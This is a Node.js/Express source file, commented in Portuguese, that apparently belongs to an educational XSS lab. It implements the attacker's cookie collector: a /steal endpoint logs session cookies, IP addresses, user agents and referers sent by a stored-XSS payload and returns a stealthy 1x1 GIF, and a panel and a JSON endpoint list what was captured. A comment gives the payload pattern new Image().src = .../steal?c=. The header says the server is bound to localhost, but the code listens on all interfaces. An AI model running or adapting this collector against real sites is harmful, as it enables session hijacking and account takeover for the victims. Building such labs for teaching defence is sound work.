/*
 * ============================================================================
 *  COLETOR DE COOKIES — "servidor do atacante" (laboratório educacional)
 * ============================================================================
 *  Papel na demonstração: recebe os cookies de sessão roubados pelo payload de
 *  XSS armazenado que executa no navegador da vítima. Fica dentro da rede
 *  isolada do laboratório (publicado só em 127.0.0.1). Nenhum dado sai da máquina.
 *
 *  Endpoints:
 *    GET /steal?c=<cookie>  -> registra o cookie recebido e responde um GIF 1x1
 *                              (o payload costuma usar new Image().src = .../steal?c=...).
 *    GET /                  -> painel simples com os cookies capturados.
 *    GET /dados             -> os mesmos dados em JSON.
 *
 *  Usa Express para as rotas e EJS para renderizar o painel.
 * ============================================================================
 */
const express = require('express');
const path = require('path');
const { URL } = require('url');
const store = require('./capture-store');

const app = express();
const PORT = process.env.PORT || 3009;

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.static(path.join(__dirname, 'public')));

// GIF transparente de 1x1 pixel (resposta discreta ao payload).
const GIF_1x1 = Buffer.from(
  'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7',
  'base64'
);

// --- Recebe o cookie roubado -----------------------------------------------
app.get('/steal', (req, res) => {
  const u = new URL(req.url, `http://localhost:${PORT}`);

  const entry = {
    time: new Date().toISOString(),
    ip: req.socket.remoteAddress,
    ua: req.headers['user-agent'] || '',
    referer: req.headers['referer'] || '',
    cookie: u.searchParams.get('c') || '',
  };

  store.addCapture(entry);

  console.log('[COOKIE CAPTURADO]', entry);

  res.status(200).set({ 'Content-Type': 'image/gif', 'Cache-Control': 'no-store' });

  return res.end(GIF_1x1);
});

// --- Dados em JSON ----------------------------------------------------------
app.get('/dados', (_req, res) => {
  res.status(200).set('Content-Type', 'application/json; charset=utf-8');

  let c = store.getCaptures();

  return res.end(JSON.stringify(c, null, 2));
});

// --- Painel do atacante -----------------------------------------------------
app.get('/', (_req, res) => {
  res.render('painel', { captured: store.getCaptures().slice().reverse() });
});

app.use((_req, res) => {
  res.status(404).set('Content-Type', 'text/plain; charset=utf-8');
  res.end('not found');
});

app.listen(PORT, () => {
  console.log(`[COLETOR] Ouvindo na porta ${PORT} — painel em http://localhost:${PORT}`);
});
